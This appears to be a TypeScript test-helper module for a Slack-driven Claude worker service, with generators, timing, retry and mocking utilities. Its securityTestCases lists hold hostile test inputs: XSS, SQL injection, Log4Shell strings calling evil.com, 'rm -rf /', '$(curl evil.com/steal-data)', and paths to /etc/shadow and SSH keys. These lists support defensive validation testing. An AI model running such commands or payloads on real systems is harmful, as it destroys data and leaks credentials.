#!/usr/bin/env bun

/**
 * Common test helper utilities
 */

import { expect, jest } from "bun:test";
import { createMockEnvironment } from "./mock-factories";

/**
 * Test data generators
 */
export const generators = {
  randomSessionKey: () =>
    `session-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`,
  randomUserId: () =>
    `U${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomChannelId: () =>
    `C${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomTeamId: () =>
    `T${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomMessageTs: () =>
    `${Date.now()}.${Math.random().toString().substr(2, 6)}`,
  randomJobName: () =>
    `claude-worker-test-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
  randomWorkspaceDir: () =>
    `/workspace/${Math.random().toString(36).substr(2, 8)}`,
  randomRepoUrl: (org = "test", repo = "repo") =>
    `https://github.com/${org}/${repo}-${Math.random().toString(36).substr(2, 5)}`,
};

/**
 * Rate limiting test helpers
 */
export const rateLimitTestHelpers = {
  /**
   * Create multiple job requests for the same user to test rate limiting
   */
  createRateLimitRequests(userId: string, count: number): any[] {
    return Array.from({ length: count }, (_, i) => ({
      userId,
      sessionKey: `rate-limit-test-${i}`,
    }));
  },

  /**
   * Mock time advancement for testing rate limit windows
   */
  mockTimeAdvancement(minutes: number) {
    const originalNow = Date.now;
    const advancedTime = originalNow() + minutes * 60 * 1000;
    Date.now = jest.fn().mockReturnValue(advancedTime);
    return () => {
      Date.now = originalNow;
    };
  },
};

/**
 * Security test cases
 */
export const securityTestCases = {
  maliciousInputs: [
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/exploit}",
    "{{7*7}}",
    "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}",
  ],

  maliciousPrompts: [
    "rm -rf /",
    "; cat /etc/passwd",
    "$(curl evil.com/steal-data)",
    "`rm -rf /`",
    "../../../../etc/passwd",
    "<script>alert('xss')</script>",
    "${jndi:ldap://evil.com/exploit}",
  ],

  maliciousRepoUrls: [
    "https://evil.com/malicious-repo",
    "ftp://github.com/user/repo",
    "javascript:alert('xss')",
    "file:///etc/passwd",
    "https://github.com/../../../etc/passwd",
  ],

  maliciousFilePaths: [
    "../../../etc/passwd",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "\\windows\\system32\\config\\sam",
    "/proc/self/environ",
    "/dev/random",
  ],

  oversizedInputs: {
    longText: "a".repeat(10000),
    hugeName: "a".repeat(1000000),
    hugePrompt: "x".repeat(10000000),
    deepObject: JSON.stringify({
      nested: { very: { deep: { object: "value" } } },
    }),
    deepNesting: JSON.stringify({ a: { b: { c: { d: { e: "deep" } } } } }),
    manyFields: Object.fromEntries(
      Array.from({ length: 1000 }, (_, i) => [`field${i}`, `value${i}`])
    ),
  },
};

/**
 * Performance test utilities
 */
export class PerformanceTracker {
  private metrics: Map<string, number[]> = new Map();

  startTimer(name: string): () => number {
    const start = performance.now();
    return () => {
      const duration = performance.now() - start;
      if (!this.metrics.has(name)) {
        this.metrics.set(name, []);
      }
      this.metrics.get(name)?.push(duration);
      return duration;
    };
  }

  getStats(name: string) {
    const values = this.metrics.get(name) || [];
    if (values.length === 0) return null;

    const sorted = [...values].sort((a, b) => a - b);
    return {
      count: values.length,
      min: sorted[0],
      max: sorted[sorted.length - 1],
      mean: values.reduce((a, b) => a + b, 0) / values.length,
      median: sorted[Math.floor(sorted.length / 2)],
      p95: sorted[Math.floor(sorted.length * 0.95)],
      p99: sorted[Math.floor(sorted.length * 0.99)],
    };
  }

  clear() {
    this.metrics.clear();
  }
}

/**
 * Resource monitoring utilities
 */
export class MockResourceMonitor {
  private metrics: Map<string, number[]> = new Map();

  recordMetric(name: string, value: number) {
    if (!this.metrics.has(name)) {
      this.metrics.set(name, []);
    }
    this.metrics.get(name)?.push(value);
  }

  getMetrics(name: string): number[] {
    return this.metrics.get(name) || [];
  }

  getAverageMetric(name: string): number {
    const values = this.getMetrics(name);
    return values.length > 0
      ? values.reduce((a, b) => a + b, 0) / values.length
      : 0;
  }

  clear() {
    this.metrics.clear();
  }

  simulateResourceUsage() {
    this.recordMetric("cpu", Math.random() * 100);
    this.recordMetric("memory", Math.random() * 1024 * 1024 * 1024); // Random GB
    this.recordMetric("disk", Math.random() * 10 * 1024 * 1024 * 1024); // Random 10GB
  }
}

/**
 * Progress tracking utilities
 */
export class MockProgressTracker {
  private updates: string[] = [];
  private callbacks: ((update: string) => void)[] = [];

  addCallback(callback: (update: string) => void) {
    this.callbacks.push(callback);
  }

  updateProgress(message: string) {
    this.updates.push(message);
    this.callbacks.forEach((callback) => {
      callback(message);
    });
  }

  getUpdates(): string[] {
    return [...this.updates];
  }

  getLastUpdate(): string | null {
    return this.updates[this.updates.length - 1] || null;
  }

  clear() {
    this.updates = [];
    this.callbacks = [];
  }
}

/**
 * Async test utilities
 */
export const asyncTestUtils = {
  /**
   * Wait for a condition to be true
   */
  async waitFor(
    condition: () => boolean | Promise<boolean>,
    timeout: number = 5000,
    interval: number = 100
  ): Promise<void> {
    const start = Date.now();
    while (Date.now() - start < timeout) {
      if (await condition()) {
        return;
      }
      await new Promise((resolve) => setTimeout(resolve, interval));
    }
    throw new Error(`Condition not met within ${timeout}ms`);
  },

  /**
   * Create a delay
   */
  delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  },

  /**
   * Test race conditions
   */
  async testConcurrency<T>(
    tasks: (() => Promise<T>)[],
    expectedResults?: T[]
  ): Promise<T[]> {
    const results = await Promise.allSettled(tasks.map((task) => task()));

    const fulfilled = results
      .filter(
        (result): result is PromiseFulfilledResult<Awaited<T>> =>
          result.status === "fulfilled"
      )
      .map((result) => result.value);

    const rejected = results
      .filter(
        (result): result is PromiseRejectedResult =>
          result.status === "rejected"
      )
      .map((result) => result.reason);

    if (rejected.length > 0) {
      console.warn(`${rejected.length} tasks failed:`, rejected);
    }

    if (expectedResults) {
      expect(fulfilled).toEqual(expectedResults as Awaited<T>[]);
    }

    return fulfilled;
  },
};

/**
 * Timeout and retry utilities
 */
export const timeoutUtils = {
  withTimeout<T>(promise: Promise<T>, timeoutMs: number): Promise<T> {
    return Promise.race([
      promise,
      new Promise<never>((_, reject) =>
        setTimeout(
          () => reject(new Error(`Timeout after ${timeoutMs}ms`)),
          timeoutMs
        )
      ),
    ]);
  },

  async retry<T>(
    operation: () => Promise<T>,
    maxAttempts: number = 3,
    delayMs: number = 100
  ): Promise<T> {
    let lastError: Error;

    for (let i = 0; i < maxAttempts; i++) {
      try {
        return await operation();
      } catch (error) {
        lastError = error as Error;
        if (i < maxAttempts - 1) {
          await new Promise((resolve) => setTimeout(resolve, delayMs));
        }
      }
    }

    throw lastError!;
  },

  delay: (ms: number) => new Promise((resolve) => setTimeout(resolve, ms)),
};

/**
 * Error simulation utilities
 */
export const errorSimulator = {
  networkError: () => new Error("Network timeout"),
  diskFullError: () => new Error("ENOSPC: no space left on device"),
  permissionError: () => new Error("EACCES: permission denied"),
  rateLimitError: () => new Error("Rate limit exceeded"),
  gitError: () => new Error("fatal: repository not found"),
  claudeApiError: () => new Error("Claude API error: model overloaded"),
  slackApiError: () => new Error("Slack API error: channel not found"),

  randomError: () => {
    const errors = [
      errorSimulator.networkError(),
      errorSimulator.diskFullError(),
      errorSimulator.permissionError(),
      errorSimulator.rateLimitError(),
    ];
    return errors[Math.floor(Math.random() * errors.length)];
  },
};

/**
 * Test environment setup and teardown
 */
export class TestEnvironment {
  private originalEnv: Record<string, string | undefined> = {};
  private cleanupCallbacks: (() => void)[] = [];

  setup(env: Record<string, string> = {}) {
    // Save original environment
    for (const key of Object.keys(env)) {
      this.originalEnv[key] = process.env[key];
      process.env[key] = env[key];
    }

    // Set default test environment
    const defaultEnv = createMockEnvironment();
    for (const [key, value] of Object.entries(defaultEnv)) {
      if (!process.env[key]) {
        this.originalEnv[key] = process.env[key];
        process.env[key] = value;
      }
    }
  }

  addCleanup(callback: () => void) {
    this.cleanupCallbacks.push(callback);
  }

  teardown() {
    // Restore original environment
    for (const [key, value] of Object.entries(this.originalEnv)) {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }

    // Run cleanup callbacks
    this.cleanupCallbacks.forEach((callback) => {
      try {
        callback();
      } catch (error) {
        console.warn("Cleanup callback failed:", error);
      }
    });

    // Reset state
    this.originalEnv = {};
    this.cleanupCallbacks = [];
  }
}

/**
 * Logging utilities for tests
 */
export const testLogger = {
  logs: [] as Array<{ level: string; message: string; timestamp: Date }>,

  log(level: string, message: string) {
    this.logs.push({ level, message, timestamp: new Date() });
  },

  info(message: string) {
    this.log("info", message);
  },

  warn(message: string) {
    this.log("warn", message);
  },

  error(message: string) {
    this.log("error", message);
  },

  getLogs(
    level?: string
  ): Array<{ level: string; message: string; timestamp: Date }> {
    return level
      ? this.logs.filter((log) => log.level === level)
      : [...this.logs];
  },

  clear() {
    this.logs = [];
  },

  expectLog(level: string, messagePattern: string | RegExp) {
    const logs = this.getLogs(level);
    const found = logs.some((log) => {
      if (typeof messagePattern === "string") {
        return log.message.includes(messagePattern);
      } else {
        return messagePattern.test(log.message);
      }
    });

    if (!found) {
      throw new Error(
        `Expected ${level} log matching ${messagePattern}, but not found`
      );
    }
  },
};